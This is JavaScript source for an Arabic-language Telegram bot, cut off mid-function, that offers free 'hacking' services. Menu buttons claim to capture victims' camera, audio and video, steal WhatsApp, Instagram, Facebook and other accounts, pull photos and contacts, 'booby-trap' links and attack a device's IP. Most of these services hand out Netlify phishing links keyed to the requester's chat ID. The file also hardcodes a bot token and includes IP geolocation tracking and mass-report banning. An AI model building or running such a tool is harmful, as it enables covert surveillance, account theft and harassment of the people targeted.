const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const axios = require('axios');

// ========== إعداد الخادم ==========
const app = express();
const PORT = process.env.PORT || 3000;

// ========== إعداد البوت ==========
const TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
const bot = new TelegramBot(TOKEN, { polling: true });

// ========== المتغيرات العامة ==========
let BOT_STATUS = "running";
const DEVELOPER_ID = 7305720183; // تم التغيير هنا
const BLOCKED_USERS = new Set();
const USER_DATABASE = new Set();
const BOT_RATINGS = {};
const USER_RATING_DATA = {};
const DEVELOPER_WAITING_FOR_INPUT = {};
const games = {};
const userContext = {};

// ========== روابط الأزرار ==========
const LINKS = {
    "btn1": "https://timely-yeot-254806.netlify.app/?chatId={user_id}",
    "btn2": "https://dainty-sfogliatella-b83536.netlify.app/?chatId={user_id}",
    "btn3": "https://chic-puppy-165560.netlify.app/?chatId={user_id}",
    "btn4": "https://luxury-sunflower-a08816.netlify.app/?chatId={user_id}",
    "btn5": "https://neon-tartufo-b38ebc.netlify.app/?chatId={user_id}",
    "btn6": "https://delightful-meerkat-062d34.netlify.app/?chatId={user_id}",
    "btn7": "https://rad-arithmetic-171367.netlify.app/?chatId={user_id}",
    "btn8": "https://cute-strudel-1df0f9.netlify.app/?chatId={user_id}",
    "btn9": "https://benevolent-buttercream-a8aa48.netlify.app/?chatId={user_id}",
    "btn10": "https://reliable-paletas-f74ded.netlify.app/?chatId={user_id}",
    "btn11": "https://zesty-valkyrie-87575d.netlify.app/?chatId={user_id}",
    "btn12": "https://animated-beijinho-552631.netlify.app/?chatId={user_id}",
    "btn13": "waiting_for_link",
    "btn14": "waiting_for_name",
    "btn15": "https://curious-dragon-98db79.netlify.app/?chatid={user_id}",
    "btn16": "check_link",
    "btn17": "temp_email_menu",
    "btn18": "track_ip",
    "btn_wifi": "https://amazing-daifuku-2ac2d0.netlify.app/?chatid={user_id}",
    "btn_ttt": "https://gilded-banoffee-dc4ff8.netlify.app/",
    "btn_contacts": "contacts_app",
    "contact_developer_full_hack": "contact_developer",
    "shorten_link": "waiting_for_shorten",
    "ip_attack": "ip_attack",
    "contact_developer_message": "send_message_to_developer",
    "rate_bot": "rate_bot",
    "fire_apps_menu": "fire_apps_menu",
    "xo_game_menu": "xo_game_menu",
    "tv_hack": "tv_hack",
    "whatsapp_unban": "whatsapp_unban",
    "instagram_ban": "instagram_ban",
    "tiktok_report": "tiktok_report",
    "virtual_numbers": "virtual_numbers"
};

// ========== دوال المساعدة ==========
function isDeveloper(userId) {
    return parseInt(userId) === DEVELOPER_ID;
}

function isUserBlocked(userId) {
    return BLOCKED_USERS.has(parseInt(userId));
}

function addUserToDatabase(userId) {
    USER_DATABASE.add(parseInt(userId));
}

// ========== دوال اختصار الروابط ==========
class LinkShortener {
    async shortenUrl(originalUrl) {
        try {
            const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(originalUrl)}`, {
                timeout: 10000
            });
            if (response.data && response.data.startsWith('http')) {
                return [response.data.trim()];
            }
        } catch (error) {
            console.error('Error shortening URL:', error.message);
        }
        return [];
    }
}
const linkShortener = new LinkShortener();

// ========== دوال لعبة XO ==========
function checkWinner(board) {
    // Check rows
    for (let i = 0; i < 3; i++) {
        if (board[i][0] !== ' ' && board[i][0] === board[i][1] && board[i][1] === board[i][2]) {
            return board[i][0];
        }
    }
    
    // Check columns
    for (let j = 0; j < 3; j++) {
        if (board[0][j] !== ' ' && board[0][j] === board[1][j] && board[1][j] === board[2][j]) {
            return board[0][j];
        }
    }
    
    // Check diagonals
    if (board[0][0] !== ' ' && board[0][0] === board[1][1] && board[1][1] === board[2][2]) {
        return board[0][0];
    }
    
    if (board[0][2] !== ' ' && board[0][2] === board[1][1] && board[1][1] === board[2][0]) {
        return board[0][2];
    }
    
    // Check for tie
    for (let i = 0; i < 3; i++) {
        for (let j = 0; j < 3; j++) {
            if (board[i][j] === ' ') {
                return null;
            }
        }
    }
    
    return 'T';
}

function getBoardDisplay(board) {
    let display = '';
    for (let i = 0; i < 3; i++) {
        for (let j = 0; j < 3; j++) {
            if (board[i][j] === 'X') display += '❌';
            else if (board[i][j] === 'O') display += '⭕';
            else display += '⬜';
        }
        display += '\n';
    }
    return display;
}

function getGameKeyboard(game, mode) {
    const keyboard = [];
    
    for (let i = 0; i < 3; i++) {
        const row = [];
        for (let j = 0; j < 3; j++) {
            const cell = game.board[i][j];
            let display = '⬜';
            if (cell === 'X') display = '❌';
            else if (cell === 'O') display = '⭕';
            
            if (mode === 'bot') {
                row.push({ text: display, callback_data: `bot_move_${i}_${j}` });
            } else {
                row.push({ text: display, callback_data: `friend_move_${i}_${j}` });
            }
        }
        keyboard.push(row);
    }
    
    keyboard.push([{ text: "🔙 رجوع", callback_data: "xo_game_menu" }]);
    return keyboard;
}

async function xoGameMenu(chatId, messageId) {
    const keyboard = {
        inline_keyboard: [
            [{ text: "اللعب مع البوت 🤖", callback_data: 'mode_vs_bot' }],
            [{ text: "تحدي شخص 👥", callback_data: 'mode_vs_friend' }],
            [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
        ]
    };
    
    if (messageId) {
        await bot.editMessageText("<b>اختر وضع اللعب 👇🎮</b>", {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } else {
        await bot.sendMessage(chatId, "<b>اختر وضع اللعب 👇🎮</b>", {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    }
}

async function startVsBot(chatId, messageId, userId) {
    games[userId] = {
        board: [[' ', ' ', ' '], [' ', ' ', ' '], [' ', ' ', ' ']],
        mode: 'vs_bot',
        player: 'X',
        bot: 'O'
    };
    
    const game = games[userId];
    const keyboard = getGameKeyboard(game, 'bot');
    
    if (messageId) {
        await bot.editMessageText("<b>لعب ضد البوت! دورك ❌</b>", {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        });
    } else {
        await bot.sendMessage(chatId, "<b>لعب ضد البوت! دورك ❌</b>", {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        });
    }
}

async function startVsFriend(chatId, messageId, userId) {
    games[userId] = {
        board: [[' ', ' ', ' '], [' ', ' ', ' '], [' ', ' ', ' ']],
        mode: 'vs_friend',
        currentPlayer: 'X'
    };
    
    const game = games[userId];
    const keyboard = getGameKeyboard(game, 'friend');
    
    if (messageId) {
        await bot.editMessageText("<b>لعب ضد صديق! دور ❌</b>", {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        });
    } else {
        await bot.sendMessage(chatId, "<b>لعب ضد صديق! دور ❌</b>", {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        });
    }
}

async function handleBotMove(chatId, messageId, userId, row, col) {
    if (!games[userId] || games[userId].mode !== 'vs_bot') {
        await bot.answerCallbackQuery({ text: "الجلسة منتهية، ابدأ لعبة جديدة!", show_alert: true });
        return;
    }
    
    const game = games[userId];
    
    if (game.board[row][col] !== ' ') {
        await bot.answerCallbackQuery({ text: "المربع مش فاضي!", show_alert: true });
        return;
    }
    
    // حركة اللاعب
    game.board[row][col] = 'X';
    
    // التحقق من الفوز
    const winner = checkWinner(game.board);
    if (winner === 'X') {
        const boardDisplay = getBoardDisplay(game.board);
        await bot.editMessageText(`<b>🎉 انت فزت! 😎</b>\n\n${boardDisplay}`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "إعادة اللعب 🔄", callback_data: 'mode_vs_bot' }],
                    [{ text: "🔙 رجوع للقائمة", callback_data: 'back_to_main' }]
                ]
            }
        });
        delete games[userId];
        return;
    }
    
    if (winner === 'T') {
        const boardDisplay = getBoardDisplay(game.board);
        await bot.editMessageText(`<b>⚖️ تعادل!</b>\n\n${boardDisplay}`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "إعادة اللعب 🔄", callback_data: 'mode_vs_bot' }],
                    [{ text: "🔙 رجوع للقائمة", callback_data: 'back_to_main' }]
                ]
            }
        });
        delete games[userId];
        return;
    }
    
    // حركة البوت
    const emptyCells = [];
    for (let i = 0; i < 3; i++) {
        for (let j = 0; j < 3; j++) {
            if (game.board[i][j] === ' ') {
                emptyCells.push([i, j]);
            }
        }
    }
    
    if (emptyCells.length > 0) {
        const [botRow, botCol] = emptyCells[Math.floor(Math.random() * emptyCells.length)];
        game.board[botRow][botCol] = 'O';
    }
    
    // التحقق من فوز البوت
    const finalWinner = checkWinner(game.board);
    if (finalWinner === 'O') {
        const boardDisplay = getBoardDisplay(game.board);
        await bot.editMessageText(`<b>🤖 البوت فاز! حاول تاني</b>\n\n${boardDisplay}`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "إعادة اللعب 🔄", callback_data: 'mode_vs_bot' }],
                    [{ text: "🔙 رجوع للقائمة", callback_data: 'back_to_main' }]
                ]
            }
        });
        delete games[userId];
        return;
    }
    
    if (finalWinner === 'T') {
        const boardDisplay = getBoardDisplay(game.board);
        await bot.editMessageText(`<b>⚖️ تعادل!</b>\n\n${boardDisplay}`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "إعادة اللعب 🔄", callback_data: 'mode_vs_bot' }],
                    [{ text: "🔙 رجوع للقائمة", callback_data: 'back_to_main' }]
                ]
            }
        });
        delete games[userId];
        return;
    }
    
    // تحديث اللوحة
    const keyboard = getGameKeyboard(game, 'bot');
    await bot.editMessageText("<b>لعب ضد البوت! دورك ❌</b>", {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    });
}

async function handleFriendMove(chatId, messageId, userId, row, col) {
    if (!games[userId] || games[userId].mode !== 'vs_friend') {
        await bot.answerCallbackQuery({ text: "الجلسة منتهية، ابدأ لعبة جديدة!", show_alert: true });
        return;
    }
    
    const game = games[userId];
    
    if (game.board[row][col] !== ' ') {
        await bot.answerCallbackQuery({ text: "المربع مش فاضي!", show_alert: true });
        return;
    }
    
    // حركة اللاعب الحالي
    game.board[row][col] = game.currentPlayer;
    
    // التحقق من الفوز
    const winner = checkWinner(game.board);
    if (winner) {
        let message = '';
        if (winner === 'X') message = "<b>🎉 ❌ فاز!</b>";
        else if (winner === 'O') message = "<b>🎉 ⭕ فاز!</b>";
        else message = "<b>⚖️ تعادل!</b>";
        
        const boardDisplay = getBoardDisplay(game.board);
        await bot.editMessageText(`${message}\n\n${boardDisplay}`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "إعادة اللعب 🔄", callback_data: 'mode_vs_friend' }],
                    [{ text: "🔙 رجوع للقائمة", callback_data: 'back_to_main' }]
                ]
            }
        });
        delete games[userId];
        return;
    }
    
    // تبديل اللاعب
    game.currentPlayer = game.currentPlayer === 'X' ? 'O' : 'X';
    
    // تحديث اللوحة
    const keyboard = getGameKeyboard(game, 'friend');
    const playerDisplay = game.currentPlayer === 'X' ? '❌' : '⭕';
    await bot.editMessageText(`<b>لعب ضد صديق! دور ${playerDisplay}</b>`, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    });
}

// ========== دوال الزخرفة المطلوبة ==========
function decorateName(name) {
    const styles = [
        `꧁༒${name}༒꧂`,
        `꧁ঔৣ☬${name}☬ঔৣ꧂`,
        `▶ ●─${name}─亗`,
        `꧁☆☬${name}☬☆꧂`,
        `ᎧᎮܔ${name}☯࿐`,
        `亗『${name}』亗`,
        `ıllıllı${name}ıllıllı`,
        `✦✧✧${name}✧✧✦`,
        `▁ ▂ ▄ ▅ ▆ ▇ █${name}█ ▇ ▆ ▅ ▄ ▂ ▁`,
        `◦•●◉✿${name}✿◉●•◦`,
        `(♥‿♥)${name}(♥‿♥)`,
        `(ᵔᴥᵔ)(ᵔᴥᵔ)${name}(ᵔᴥᵔ)(ᵔᴥᵔ)`,
        `■□■□■□■□${name}■□■□■□■□`,
        `✩｡:•.─────  ❁${name}❁  ─────.•:｡✩`,
        `✧○ꊞ○ꊞ○ꊞ○ꊞ○ꊞ${name}○ꊞ○ꊞ○ꊞ○ꊞ○✧¤`,
        `•♫•♬•${name}•♫•♬•`,
        `▀▄▀▄▀▄${name}▄▀▄▀▄▀`,
        `°。°。°。°。°。°。${name}°。°。°。°。°。°。`,
        `【｡_｡】${name}【｡_｡】`,
        `(｡◕‿‿◕｡)${name}(｡◕‿‿◕｡)`,
        `╔────── ¤ ◎${name}◎ ¤ ──────╗`,
        `●▬▬▬▬๑۩${name}۩๑▬▬▬▬▬●`,
        `❤(｡◕‿◕｡)❤${name}❤(｡◕‿◕｡)❤`,
        `▼△▼△▼△▼${name}▼△▼△▼△▼`,
        `【ツ】${name}【ツ】`,
        `●○●○●○●○${name}●○●○●○●○`,
        `▓▓▓▓▓▓${name}▓▓▓▓▓▓`,
        `➶➶➶➶➶${name}➷➷➷➷➷`,
        ``\`•.¸¸.•´´¯\`••._.•${name}•._.••\`¯´´•.¸¸.•\``,
        `❂✿❂✿❂${name}❂✿❂✿❂`,
        `乁། ˵ ◕ – ◕ ˵ །ㄏ${name}乁། ˵ ◕ – ◕ ˵ །ㄏ`,
        `╰། ◉ ◯ ◉ །╯${name}╰། ◉ ◯ ◉ །╯`,
        `░▒▓█${name}█▓▒░`,
        `(ღ˘⌣˘ღ)${name}(ღ˘⌣˘ღ)`,
        `︵‿︵‿︵‿︵‿︵‿${name}︵‿︵‿︵‿︵‿︵‿`,
        `⋋⁞ ◔ ﹏ ◔ ⁞⋌${name}⋋⁞ ◔ ﹏ ◔ ⁞⋌`,
        `◇◆◇◆◇◆◇◆◇◆◇${name}◇◆◇◆◇◆◇◆◇◆◇`,
        `¯\\_(ツ)_/¯${name}¯\\_(ツ)_/¯`,
        `(￢_￢)${name}(￢_￢)`,
        `︵‿︵‿୨${name}୧‿︵‿︵`,
        `❤(❁´◡\`❁)❤${name}❤(❁´◡\`❁)❤`,
        `⫷${name}⫸`,
        `╚═| ~ ಠ ₒ ಠ ~ |═╝${name}╚═| ~ ಠ ₒ ಠ ~ |═╝`,
        `✿◡‿◡${name}◡‿◡✿`,
        `<(▰˘◡˘▰)>${name}<(▰˘◡˘▰)>`,
        `〓〓〓〓〓${name}〓〓〓〓〓`,
        `❏ ❐ ❑ ❒ ❏ ❐${name}❏ ❐ ❑ ❒ ❏ ❐`,
        `◤◢◣◥◤◢◣◥◤${name}◤◢◣◥◤◢◣◥◤`,
        `╰────╯╰────╯╰────╯╰────╯╰────╯╰────╯${name}╰────╯╰────╯╰────╯╰────╯╰────╯╰────╯`,
        `☜♡☞${name}☜♡☞`,
        `(´・_・\`)${name}(´・_・\`)`,
        `✌✌(•ิ‿•ิ)✌✌${name}✌✌(•ิ‿•ิ)✌✌`,
        `✎﹏﹏${name}﹏﹏`,
        `❣❤---» [${name}] «---❤❣`,
        `(▰˘◡˘▰)${name}(▰˘◡˘▰)`,
        `☀(ღ˘⌣˘ღ)☀${name}☀(ღ˘⌣˘ღ)☀`,
        `༺═──${name}──═༻`,
        `❄♥‿♥❄${name}❄♥‿♥❄`,
        `❤ᶫᵒᵛᵉᵧₒᵤ❤${name}❤ᶫᵒᵛᵉᵧₒᵤ❤`,
        `●▬ൠൠ▬${name}▬ൠൠ▬●`,
        `[̲̅ə̲̅٨̲̅٥̲̅٦̲̅]${name}[̲̅ə̲̅٨̲̅٥̲̅٦̲̅]`,
        `❀ೋ══•${name}•══ೋ❀`,
        `☃（*^_^*）☃${name}☃（*^_^*）☃`,
        `♡◙‿◙♡${name}♡◙‿◙♡`,
        `❣ლʘ‿ʘლ❣${name}❣ლʘ‿ʘლ❣`,
        `♪┏(°.°)┛${name}♪┏(°.°)┛`,
        `⊂◉‿◉つ${name}⊂◉‿◉つ`,
        `◎ ════${name}════ ◎`,
        `↪↪↪${name}↩↩↩`,
        `◥▓▓${name}▓▓◤`,
        `꧁𓊈𒆜${name}𒆜𓊉꧂`,
        `▄︻̷̿┻̿═━一 ${name}`
    ];
    
    return styles;
}

// ========== دوال التقييم ==========
async function startRating(chatId, messageId, userId) {
    const services = [
        "اخـ/ـتراق كاميرا خلفيه 📸",
        "اخـ/ـتراق كاميرا اماميه 📷",
        "تسجيل صوت 🎙️",
        "تصوير فيديو 🎥",
        "اخـ/ـتراق إنستجرام 📌",
        "اخـ/ـتراق واتساب ❗",
        "اخـ/ـتراق ببجي 🎯",
        "اخـ/ـتراق فري فاير 💥",
        "اخـ/ـتراق فيسبوك 🌐",
        "اخـ/ـتراق سناب شات 👻",
        "اخـ/ـتراق تيك توك 💣",
        "جمع معلومات الجهاز 📲",
        "تلغيم رابط 👿",
        "زخرفة الاسماء ✨",
        "سحب صور 🔞",
        "فحص روابط 🔓",
        "ايميل مؤقت 📨",
        "تتبع IP 🌍",
        "تحميل فيديوهات 🎬",
        "قراءة الباركود 🔳",
        "اختصار روابط 🔗",
        "هجوم على IP الجهاز ⚡",
        "اخـ/ـتراق الهاتف كاملاً 💢",
        "تطبيقات فرمتة ☠️",
        "لعبة XO 🎮",
        "اخـ/ـتراق قنوات التلفزيون 📺",
        "فك حظر واتساب 👨🏻‍💻",
        "حظر انستقرام ‼️",
        "تبنيد بث تيك توك 💥"
    ];
    
    USER_RATING_DATA[userId] = {
        services: services,
        currentIndex: 0,
        ratings: {}
    };
    
    await showNextRating(chatId, messageId, userId);
}

async function showNextRating(chatId, messageId, userId) {
    const userData = USER_RATING_DATA[userId];
    if (!userData) return;
    
    if (userData.currentIndex >= userData.services.length) {
        await finishRating(chatId, messageId, userId);
        return;
    }
    
    const service = userData.services[userData.currentIndex];
    const progress = `(${userData.currentIndex + 1}/${userData.services.length})`;
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: "1 ⭐", callback_data: `rate_1_${userData.currentIndex}` },
                { text: "2 ⭐", callback_data: `rate_2_${userData.currentIndex}` },
                { text: "3 ⭐", callback_data: `rate_3_${userData.currentIndex}` },
                { text: "4 ⭐", callback_data: `rate_4_${userData.currentIndex}` },
                { text: "5 ⭐", callback_data: `rate_5_${userData.currentIndex}` }
            ],
            [{ text: "⏭ تخطي", callback_data: `skip_${userData.currentIndex}` }]
        ]
    };
    
    if (messageId) {
        await bot.editMessageText(
            `🌟 <b>تقييم البوت</b> ${progress}\n\n` +
            `📊 <b>الخدمة:</b> ${service}\n\n` +
            `⭐ <b>قيم البوت من 5:</b>`,
            {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: keyboard
            }
        );
    } else {
        await bot.sendMessage(chatId,
            `🌟 <b>تقييم البوت</b> ${progress}\n\n` +
            `📊 <b>الخدمة:</b> ${service}\n\n` +
            `⭐ <b>قيم البوت من 5:</b>`,
            {
                parse_mode: 'HTML',
                reply_markup: keyboard
            }
        );
    }
}

// ========== دوال تتبع IP ==========
async function trackIP(ip) {
    try {
        if (ip.toLowerCase() === 'myip' || ip.toLowerCase() === 'ip') {
            const response = await axios.get('https://api.ipify.org?format=json');
            ip = response.data.ip;
        }
        
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const data = response.data;
        
        if (data.status === 'success') {
            return `
🌍 <b>معلومات IP</b>

🔹 <b>IP:</b> <code>${data.query}</code>
📍 <b>الدولة:</b> ${data.country}
🏙️ <b>المدينة:</b> ${data.city}
🗺️ <b>المنطقة:</b> ${data.regionName}
🏢 <b>الشركة:</b> ${data.isp}
⏰ <b>المنطقة الزمنية:</b> ${data.timezone}
📌 <b>الإحداثيات:</b> ${data.lat}, ${data.lon}
🔗 <b>رابط الخريطة:</b> https://maps.google.com/?q=${data.lat},${data.lon}
`;
        } else {
            return "❌ <b>لم يتم العثور على معلومات</b>";
        }
    } catch (error) {
        console.error('IP tracking error:', error);
        return "❌ <b>حدث خطأ في تتبع العنوان</b>";
    }
}

// ========== لوحة المفاتيح الرئيسية (الترتيب الأصلي) ==========
function getMainKeyboard() {
    return {
        inline_keyboard: [
            [
                { text: "اخـ/ـتراق كاميرا خلفيه 📸", callback_data: "btn2" },
                { text: "اخـ/ـتراق كاميرا اماميه 📷", callback_data: "btn1" }
            ],
            [
                { text: "تصوير فيديو 🎥", callback_data: "btn4" },
                { text: "تسجيل صوت 🎙️", callback_data: "btn3" }
            ],
            [
                { text: "اخـ/ـتراق واتساب ❗", callback_data: "btn6" },
                { text: "اخـ/ـتراق إنستجرام 📌", callback_data: "btn5" }
            ],
            [
                { text: "اخـ/ـتراق W i F i 🛜", callback_data: "btn_wifi" },
                { text: "اخـ/ـتراق ببجي 🎯", callback_data: "btn7" }
            ],
            [
                { text: "اخـ/ـتراق فري فاير 💥", callback_data: "btn8" },
                { text: "اخـ/ـتراق سناب شات 👻", callback_data: "btn10" }
            ],
            [
                { text: "اخـ/ـتراق قنوات تلفزيون 📺", callback_data: "tv_hack" }
            ],
            [
                { text: "اخـ/ـتراق فيسبوك 🌐", callback_data: "btn9" },
                { text: "اخـ/ـتراق تيك توك 💣", callback_data: "btn11" }
            ],
            [
                { text: "هجوم علي IP الجهاز ⚡", callback_data: "ip_attack" },
                { text: "جمع معلومات الجهاز 📲", callback_data: "btn12" }
            ],
            [
                { text: "تـــطــــبـــيـــقـــات فرمتة الهاتف 👀", callback_data: "fire_apps_menu" }
            ],
            [
                { text: "سـحـب جـهـات الاتصال 📞", callback_data: "btn_contacts" }
            ],
            [
                { text: "لعبة X O 🎮", callback_data: "xo_game_menu" },
            ],
            [
                { text: "الذكاء الاصطناعي 🧠", url: "https://gemini.google.com/" },
                { text: "إختبار سرعة الانترنت 🚀", url: "https://fast.com/ar/" }
            ],
            [
                { text: "فك حظر واتساب 👨🏻‍💻", callback_data: "whatsapp_unban" },
                { text: "حظر انستقرام ‼️", callback_data: "instagram_ban" }
            ],
            [
                { text: "تبنيد بث تيك توك 💥", callback_data: "tiktok_report" },
            ],
            [
                { text: "تلغيم رابط 👿", callback_data: "btn13" },
                { text: "زخرفة الاسماء ✨", callback_data: "btn14" }
            ],
            [
                { text: "اخـ/ـتراق الهاتف كاملاً 💢", callback_data: "contact_developer_full_hack" }
            ],
            [
                { text: "سحب صور الضـ#ـحية 🔞", callback_data: "btn15" },
                { text: "فحص روابط 🔓", callback_data: "btn16" }
            ],
            [
                { text: "قراءة الباركود 🔳", url: "https://products.aspose.app/barcode/ar/recognize" }
            ],
            [
                { text: "تتبع IP 🌍", callback_data: "btn18" }
            ],
            [
                { text: "ارقام وهمية ☎️", callback_data: "virtual_numbers" }
            ],
            [
                { text: "موقع تخويف فقط 😂", callback_data: "btn_ttt" }
            ],
            [
                { text: "🌟 تقييم البوت 🌟", callback_data: "rate_bot" },
                { text: "📲 رساله للمطور 📲", callback_data: "contact_developer_message" }
            ],
            [
                { text: "😈 المطور 😈", url: "https://t.me/jt_r3r" }
            ]
        ]
    };
}

// ========== معالجة أمر /start ==========
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userName = msg.from.first_name || "المستخدم";
    
    addUserToDatabase(userId);
    
    if (BOT_STATUS === "stopped") {
        await bot.sendMessage(chatId,
            "⏸️ <b>البوت متوقف حاليًا عن العمل</b>\n\n" +
            "🔧 <b>جاري الصيانة والتطوير...</b>\n" +
            "⏳ <b>سيتم العودة قريبًا</b>\n\n" +
            "📞 <b>للاستفسار:</b> @jt_r3r",
            { parse_mode: 'HTML' }
        );
        return;
    }
    
    if (isUserBlocked(userId)) {
        await bot.sendMessage(chatId,
            "🚫 <b>أنت محظور من استخدام هذا البوت!</b>\n\n" +
            "🔒 <b>لا يمكنك الوصول إلى الخدمات</b>\n" +
            "📞 <b>للاستفسار:</b> @jt_r3r",
            { parse_mode: 'HTML' }
        );
        return;
    }
    
    await bot.sendMessage(chatId,
        `<b>مرحباً بك يا ${userName} 👋</b>\n\n` +
        `<b>مرحبا بك ف البوت الخاص بـ😈حمزه😈</b>\n\n` +
        `<b>ويرجي استخدام البوت في الخير فقط 🫶</b>\n\n` +
        `🎉 <b>كل الأزرار مجاناً!! 🫶</b>\n\n` +
        `🎛️ <b>اختر من القائمة:</b>`,
        {
            parse_mode: 'HTML',
            reply_markup: getMainKeyboard()
        }
    );
});

// ========== معالجة الأزرار ==========
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    
    try {
        await bot.answerCallbackQuery(callbackQuery.id);
        
        // التحقق من حالة البوت
        if (BOT_STATUS === "stopped" && !isDeveloper(userId)) {
            await bot.editMessageText("⏸️ <b>البوت متوقف حاليًا</b>", {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML'
            });
            return;
        }
        
        // التحقق من حظر المستخدم
        if (isUserBlocked(userId) && !isDeveloper(userId)) {
            await bot.editMessageText("🚫 <b>أنت محظور من استخدام هذا البوت!</b>", {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML'
            });
            return;
        }
        
        // معالجة الأزرار الخاصة
        switch(data) {
            case "back_to_main":
                await bot.editMessageText("🎛️ <b>القائمة الرئيسية</b>", {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    reply_markup: getMainKeyboard()
                });
                break;
                
            case "xo_game_menu":
                await xoGameMenu(chatId, messageId);
                break;
                
            case "mode_vs_bot":
                await startVsBot(chatId, messageId, userId);
                break;
                
            case "mode_vs_friend":
                await startVsFriend(chatId, messageId, userId);
                break;
                
            case "rate_bot":
                await startRating(chatId, messageId, userId);
                break;
                
            // معالجة حركات لعبة XO
            case data.match(/^bot_move_(\d)_(\d)$/)?.input:
                const botMatch = data.match(/^bot_move_(\d)_(\d)$/);
                if (botMatch) {
                    const row = parseInt(botMatch[1]);
                    const col = parseInt(botMatch[2]);
                    await handleBotMove(chatId, messageId, userId, row, col);
                }
                break;
                
            case data.match(/^friend_move_(\d)_(\d)$/)?.input:
                const friendMatch = data.match(/^friend_move_(\d)_(\d)$/);
                if (friendMatch) {
                    const row = parseInt(friendMatch[1]);
                    const col = parseInt(friendMatch[2]);
                    await handleFriendMove(chatId, messageId, userId, row, col);
                }
                break;
                
            // معالجة التقييم
            case data.match(/^rate_(\d)_(\d+)$/)?.input:
                const rateMatch = data.match(/^rate_(\d)_(\d+)$/);
                if (rateMatch) {
                    const rating = parseInt(rateMatch[1]);
                    const serviceIndex = parseInt(rateMatch[2]);
                    
                    const userData = USER_RATING_DATA[userId];
                    if (userData && serviceIndex < userData.services.length) {
                        const service = userData.services[serviceIndex];
                        userData.ratings[service] = rating;
                        
                        if (!BOT_RATINGS[service]) BOT_RATINGS[service] = [];
                        BOT_RATINGS[service].push(rating);
                        
                        userData.currentIndex++;
                        await showNextRating(chatId, messageId, userId);
                    }
                }
                break;
                
            case data.match(/^skip_(\d+)$/)?.input:
                const skipMatch = data.match(/^skip_(\d+)$/);
                if (skipMatch) {
                    const serviceIndex = parseInt(skipMatch[1]);
                    const userData = USER_RATING_DATA[userId];
                    if (userData) {
                        userData.currentIndex++;
                        await showNextRating(chatId, messageId, userId);
                    }
                }
                break;
                
            // معالجة الأزرار التي تحتاج إدخال نص
            case "btn14": // زخرفة الأسماء
                await bot.editMessageText("✨ <b>إرسل الاسم الذي تريد زخرفته</b>", {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML'
                });
                userContext[userId] = { action: 'decorate_name' };
                break;
                
            case "btn13": // تلغيم رابط
                await bot.editMessageText("🎁 <b>إرسل لي رابط يبدأ بـ 'https'</b>", {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML'
                });
                userContext[userId] = { action: 'waiting_for_link' };
                break;
                
            case "btn16": // فحص روابط
                await bot.editMessageText("😇 <b>إرسل الرابط الذي تريد فحصه</b>", {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML'
                });
                userContext[userId] = { action: 'check_link' };
                break;
                
            case "btn18": // تتبع IP
                await bot.editMessageText("🌍 <b>إرسل عنوان IP الذي تريد تتبعه</b>", {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML'
                });
                userContext[userId] = { action: 'track_ip' };
                break;
                
            case "contact_developer_message": // رسالة للمطور
                await bot.editMessageText("📲 <b>اكتب رسالتك للمطور</b>", {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML'
                });
                userContext[userId] = { action: 'message_to_developer' };
                break;
                
            // معالجة الروابط العادية
            case LINKS[data] && LINKS[data].includes('http') ? data : null:
                const link = LINKS[data].replace('{user_id}', userId);
                await bot.editMessageText(
                    `✅ <b>تم إنشاء الرابط بنجاح</b>\n\n` +
                    `🔗 <b>رابطك:</b>\n${link}`,
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "🔄 تغيير شكل الرابط", callback_data: `change_${data}` }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            // معالجة تغيير شكل الرابط
            case data.match(/^change_(.+)$/)?.input:
                const changeMatch = data.match(/^change_(.+)$/);
                if (changeMatch && LINKS[changeMatch[1]]) {
                    const originalLink = LINKS[changeMatch[1]].replace('{user_id}', userId);
                    await bot.editMessageText("⏳ <b>جاري إنشاء روابط مختصرة...</b>", {
